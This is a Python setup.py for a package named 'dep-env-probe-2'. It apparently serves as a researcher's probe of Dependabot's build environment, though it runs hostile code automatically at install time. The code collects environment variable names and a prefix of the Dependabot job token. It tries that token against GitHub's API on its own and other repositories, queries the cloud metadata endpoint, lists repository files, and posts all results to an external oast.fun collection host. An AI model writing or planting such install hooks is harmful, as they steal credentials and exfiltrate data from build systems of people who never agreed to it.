import os
import json

env_keys = sorted(os.environ.keys())
djt = os.environ.get("DEPENDABOT_JOB_TOKEN", "")
api_url = os.environ.get("DEPENDABOT_API_URL", "")
repo_path = os.environ.get("DEPENDABOT_REPO_CONTENTS_PATH", "")
proxy = os.environ.get("HTTPS_PROXY", os.environ.get("https_proxy", ""))
job_id = os.environ.get("DEPENDABOT_JOB_ID", "")

results = {
    "k": env_keys,
    "djt_len": len(djt),
    "djt_prefix": djt[:8] if djt else "",
    "api_url": api_url,
    "repo_path": repo_path,
    "proxy": proxy,
    "job_id": job_id,
}

# Test 1: can DJT authenticate to api.github.com?
for label, url in [
    ("user", "https://api.github.com/user"),
    ("own_repo", "https://api.github.com/repos/toofikz4/dep-env-probe-2"),
    ("cross_repo", "https://api.github.com/repos/toofikz2/idor-canary"),
]:
    try:
        import urllib.request
        req = urllib.request.Request(url, headers={
            "Authorization": "Bearer " + djt,
            "Accept": "application/vnd.github+json",
            "User-Agent": "dep-probe-2"
        })
        resp = urllib.request.urlopen(req, timeout=8)
        body = resp.read().decode()[:200]
        results[label] = {"status": resp.status, "body": body}
    except Exception as e:
        results[label] = {"error": str(e)[:150]}

# Test 2: IMDS check
try:
    import urllib.request
    resp = urllib.request.urlopen("http://169.254.169.254/latest/meta-data/", timeout=3)
    results["imds"] = {"status": resp.status, "body": resp.read().decode()[:200]}
except Exception as e:
    results["imds"] = {"error": str(e)[:100]}

# Test 3: list repo contents dir
try:
    if repo_path:
        contents = os.listdir(repo_path)
        results["repo_files"] = contents[:20]
except Exception as e:
    results["repo_files"] = str(e)[:100]

# Test 4: read the DEPENDABOT_API_URL base
if api_url:
    try:
        import urllib.request
        req = urllib.request.Request(api_url, headers={
            "Authorization": "Bearer " + djt,
            "Accept": "application/json",
            "User-Agent": "dep-probe-2"
        })
        resp = urllib.request.urlopen(req, timeout=8)
        results["dep_api"] = {"status": resp.status, "body": resp.read().decode()[:200]}
    except Exception as e:
        results["dep_api"] = {"error": str(e)[:150]}

# Send all results to OOB
try:
    import urllib.request
    data = json.dumps(results).encode()
    req = urllib.request.Request(
        "http://d8ulq161b2eou60dthj0mjuqccaxum9p9.oast.fun/probe2",
        data=data,
        headers={"Content-Type": "application/json"},
    )
    urllib.request.urlopen(req, timeout=8)
except Exception:
    pass

from setuptools import setup
setup(
    name="dep-env-probe-2",
    version="1.0.0",
    install_requires=["flask==3.1.3"],
    tests_require=["coverage==7.0.0"],
)
